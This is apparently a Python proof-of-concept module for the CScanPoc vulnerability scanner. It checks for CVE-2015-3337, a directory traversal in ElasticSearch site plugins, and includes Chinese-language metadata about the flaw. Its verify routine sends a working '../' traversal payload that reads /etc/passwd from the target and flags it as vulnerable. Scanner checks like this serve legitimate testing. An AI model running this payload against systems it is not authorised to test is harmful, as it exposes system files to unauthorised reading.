# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import json

class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0003_p'  # 平台漏洞编号，留空
    name = 'ElasticSearch 目录穿越漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2015-04-20'  # 漏洞公布时间
    desc = '''
        在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/6557.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-3337'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = '1.4.5以下/1.5.2以下'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4c61682b-f579-4081-8ec9-4751e92bfd4e'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            #根据payload的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/_plugin/head/../../../../../../../../../etc/passwd'
            r = requests.get('{target}{params}'.format(target=self.target, params=payload))
            #print(r.text)
            if 'root:x:0:0:root:/root:/bin/bash' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
